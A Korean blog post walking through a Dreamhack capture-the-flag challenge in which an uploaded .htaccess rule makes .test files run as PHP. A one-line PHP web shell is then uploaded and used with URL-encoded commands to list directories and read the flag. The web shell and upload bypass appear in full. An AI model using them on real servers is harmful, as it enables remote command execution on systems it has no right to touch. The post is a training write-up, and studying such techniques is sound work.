---
layout: post
title: "[Dreamhack] Apache htaccess 문제풀이"
date: 2023-12-10
categories: "web-hacking"
---
Apache htaccess 문제를 풀어보겠습니다!
일단 문제에서 어떻게 풀어야하는지 알려주고 있습니다. Apache 설정 파일인 `.htaccess`를 통해서 풀어야하는 문제입니다.  

```htaccess
AddType application/x-httpd-php .test
```
위 코드를 써서 업로드합니다. 업로드가 성공되면 위와 같이 성공적으로 업로드가 되었다는 결과를 볼 수 있습니다.  
`.test` 파일을 php로 동작할 수 있도록 해주는 명령어입니다.  

![00](/hacking/assets/images/dreamhack/apache-htaccess/00.png)

위와 같이 성공하였다면! 이제 본격적으로 `.php`파일을 업로드하여, 플래그를 획득해 보겠습니다.

```php
// webshell.test
<?php
	system($_GET['cmd']);
?>
```

위와 같이 `webshell.test` 파일을 작성하여, 업로드하면 파라미터를 통해서 서버 내부의 명령어를 사용할 수 있습니다.

![01](/hacking/assets/images/dreamhack/apache-htaccess/01.png)

정상적으로 파라미터를 통해서 명령어를 확인하여, `cd / && ls -al`를 실행시켜 보겠습니다.  
일단 URL 인코딩을 통해서 파라미터에서 명령어가 동작할 수 있도록 해야합니다.  
`webshell.test?cmd=cd+%2f+%26%26+ls+-al`이와 같이 작성하면 아래와 같이 명령어가 잘 동작합니다.

![02](/hacking/assets/images/dreamhack/apache-htaccess/02.png)

![03](/hacking/assets/images/dreamhack/apache-htaccess/03.png)

위를 통해서 플래그를 확인할 수 있습니다. 이제 플래그를 확인해 보겠습니다.

![04](/hacking/assets/images/dreamhack/apache-htaccess/04.png)

이렇게 플래그를 획득할 수 있습니다 :)